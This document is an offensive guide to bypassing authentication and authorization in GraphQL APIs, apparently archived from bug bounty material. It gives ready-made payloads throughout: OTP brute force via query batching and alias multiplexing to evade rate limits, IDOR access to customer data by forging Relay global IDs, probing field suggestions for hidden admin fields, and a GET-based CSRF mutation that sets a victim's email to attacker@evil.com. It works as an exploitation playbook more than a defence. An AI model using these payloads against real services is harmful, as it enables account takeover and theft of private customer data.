# GraphQL Authentication & Authorization Bypass Patterns

A comprehensive guide to uncovering and exploiting authentication bypasses, broken object level authorization (BOLA/IDOR), and rate-limit evasions in GraphQL APIs.

---

## 1. Fundamental GraphQL Auth Differences vs. REST

Unlike traditional REST architectures where access control is evaluated per URL path (`/api/v1/users`, `/api/v1/admin`), GraphQL typically exposes a single endpoint (`POST /graphql` or `/api/graphql`). 

**Security Implication:** 
- Traditional Web Application Firewalls (WAFs) and API gateways that protect endpoints by URI pattern cannot distinguish between a low-privileged public query and a highly-privileged administrative mutation.
- Authorization logic must be enforced granularly at the **Resolver Level** or **Field Level**.

---

## 2. Attack Vector 1: 2FA & OTP Bypass via Query Batching

When an application implements rate limiting on REST endpoints (e.g., maximum 5 attempts per IP), GraphQL APIs often support **Batch Requests** (array of queries), executing multiple operations within a single HTTP transaction.

### A. JSON Array Batching
Instead of sending individual requests:
```json
[
  {"query": "mutation { verifyOTP(email: \"victim@target.com\", code: \"0001\") { success token } }"},
  {"query": "mutation { verifyOTP(email: \"victim@target.com\", code: \"0002\") { success token } }"},
  {"query": "mutation { verifyOTP(email: \"victim@target.com\", code: \"0003\") { success token } }"},
  ...
  {"query": "mutation { verifyOTP(email: \"victim@target.com\", code: \"1000\") { success token } }"}
]
```
- The rate limiter counts this as **1 HTTP request**.
- The backend resolves all 1,000 queries concurrently.
- When the correct OTP is hit, the response returns the authenticated session token.

### B. Alias Multiplexing (Bypassing Array Batching Blocks)
If the server disables JSON array batching, an attacker can combine multiple operations into a **single GraphQL query** using aliases:

```graphql
mutation BruteForce2FA {
  c0001: verifyOTP(email: "victim@target.com", code: "0001") { success token }
  c0002: verifyOTP(email: "victim@target.com", code: "0002") { success token }
  c0003: verifyOTP(email: "victim@target.com", code: "0003") { success token }
  ...
  c9999: verifyOTP(email: "victim@target.com", code: "9999") { success token }
}
```
Because this is a single valid GraphQL document, both WAFs and batch-blocking middleware pass it straight to the GraphQL engine.

---

## 3. Attack Vector 2: BOLA / IDOR via Relay Global Node IDs

Many modern GraphQL implementations (e.g., Shopify, GitHub, Facebook) follow the **Relay Global Object Identification** specification. Every object has a universally unique `id`.

### Anatomy of a Relay Global ID:
A typical query returns:
```json
{
  "data": {
    "user": {
      "id": "Z2lkOi8vc2hvcGlmeS9DdXN0b21lci81OTgxNDY="
    }
  }
}
```

Decoding the Base64 string reveals the internal schema and numeric identifier:
```bash
echo -n "Z2lkOi8vc2hvcGlmeS9DdXN0b21lci81OTgxNDY=" | base64 -d
# Output: gid://shopify/Customer/598146
```

### Exploit Methodology:
1. Identify the target victim's numeric database ID (or increment the ID).
2. Construct the target victim's Global ID:
   ```python
   import base64
   victim_gid = base64.b64encode(b"gid://shopify/Customer/598147").decode()
   ```
3. Query the universal `node` interface:
   ```graphql
   query AccessVictim {
     node(id: "Z2lkOi8vc2hvcGlmeS9DdXN0b21lci81OTgxNDc=") {
       ... on Customer {
         id
         email
         phone
         orders {
           totalPrice
           billingAddress
         }
       }
     }
   }
   ```
4. If the resolver for `node` verifies that the ID exists but forgets to check if `context.currentUser.id == requestedId`, complete unauthorized data disclosure occurs.

---

## 4. Attack Vector 3: Field-Level Authorization Directives Bypass

GraphQL schemas often utilize custom schema directives for authorization:
```graphql
type User {
  id: ID!
  username: String!
  email: String! @auth(role: "ADMIN")
  bankDetails: BankAccount! @hasRole(role: "BILLING")
}
```

### Common Bypass Flaws:
1. **Unprotected Related Edge Resolvers:**
   Directly querying `user.email` is blocked, but navigating through an unauthenticated relational edge bypasses the check:
   ```graphql
   query LeakedEmail {
     team(id: "team_1") {
       members {
         # Field directive missing here
         email
       }
     }
   }
   ```
2. **Field Suggestions Information Disclosure:**
   When introspection is disabled, sending a deliberate typo reveals hidden and privileged fields:
   ```graphql
   query {
     user(id: "1") {
       admin_pasword
     }
   }
   ```
   Error response:
   ```json
   {
     "errors": [{
       "message": "Cannot query field 'admin_pasword' on type 'User'. Did you mean 'admin_password' or 'admin_token'?"
     }]
   }
   ```

---

## 5. Attack Vector 4: GraphQL CSRF / GET-based State Modification

By specification, GraphQL queries can be executed via HTTP `GET` requests using query parameters:
```http
GET /graphql?query=mutation{updateEmail(newEmail:"attacker@evil.com"){status}} HTTP/1.1
Host: target.com
Cookie: session=victim_session
```

If the server fails to enforce:
1. Strict `POST` method requirement for mutations,
2. `Content-Type: application/json` enforcement (allowing `text/plain` or `application/x-www-form-urlencoded`),
3. Antiforgery / SameSite tokens,

An attacker can execute cross-site mutations leading to zero-click account takeover via a simple `<img>` tag or automated fetch.

---
*Archived in Auth Bypass Vault from verified bug bounty community intelligence.*
